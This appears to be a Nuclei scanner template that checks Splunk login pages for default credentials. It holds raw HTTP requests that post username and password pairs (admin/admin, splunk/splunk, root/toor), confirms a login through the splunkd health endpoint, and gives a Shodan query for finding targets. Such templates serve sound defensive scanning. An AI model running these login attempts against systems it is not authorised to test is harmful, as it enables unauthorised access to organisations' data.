http:
- attack: pitchfork
  extractors:
  - internal: true
    name: cval
    part: header
    regex:
    - cval=([0-9]+)
    type: regex
  host-redirects: true
  matchers:
  - condition: and
    part: body_3
    type: word
    words:
    - splunkd
    - updated
  - status:
    - 200
    type: status
  matchers-condition: and
  payloads:
    password:
    - admin
    - splunk
    - toor
    username:
    - admin
    - splunk
    - root
  raw:
  - 'GET /en-US/account/login?return_to=%2Fen-US%2Faccount%2F HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST /en-US/account/login HTTP/1.1

    Host: {{Hostname}}

    Accept-Encoding: gzip, deflate, br

    Referer: {{BaseURL}}

    Content-Type: application/x-www-form-urlencoded; charset=UTF-8

    X-Requested-With: XMLHttpRequest

    Origin: {{BaseURL}}


    {{cval}}&username={{username}}&password={{password}}&return_to=%2Fen-US%2F&set_has_logged_in=false

    '
  - 'GET /en-US/splunkd/__raw/services/server/health/splunkd?output_mode=json&_= HTTP/1.1

    Host: {{Hostname}}

    Accept-Encoding: gzip, deflate, br

    Referer: {{BaseURL}}

    '
  stop-at-first-match: true
id: splunk-default-login
info:
  author: pussycat0x
  classification:
    cpe: cpe:2.3:a:splunk:splunk:*:*:*:*:*:*:*:*
  description: 'Splunk Default Password Vulnerability exposes systems to unauthorized
    access, compromising data integrity and security.

    '
  metadata:
    max-request: 9
    product: splunk
    shodan-query: http.title:"Splunk"
    vendor: splunk
    verified: true
  name: Splunk - Default Password
  severity: high
  tags: default-login,splunk,vuln
